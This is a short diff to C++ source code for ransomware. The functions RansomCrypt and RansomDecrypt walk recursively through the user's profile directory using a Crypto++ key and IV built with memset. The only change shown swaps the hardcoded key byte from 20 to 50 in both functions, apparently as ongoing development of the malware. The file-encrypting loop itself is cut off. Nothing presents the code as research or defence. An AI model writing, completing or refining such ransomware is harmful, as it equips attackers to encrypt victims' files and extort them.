@@ -43,7 +43,7 @@ namespace fs = std::filesystem;
 void RansomCrypt() {
     string path = getenv("USERPROFILE");
     CryptoPP::byte key[32], iv[16];
-    int mykey = 20;
+    int mykey = 50;
     memset(key, mykey, 32);
     memset(iv, 1125884, 16);
 
@@ -96,7 +96,7 @@ void RansomCrypt() {
 void RansomDecrypt() {
     string path = getenv("USERPROFILE");
     CryptoPP::byte key[32], iv[16];
-    memset(key, 20, 32);
+    memset(key, 50, 32);
     memset(iv, 1125884, 16);
 
     for (const auto& filename : fs::recursive_directory_iterator(path)) {
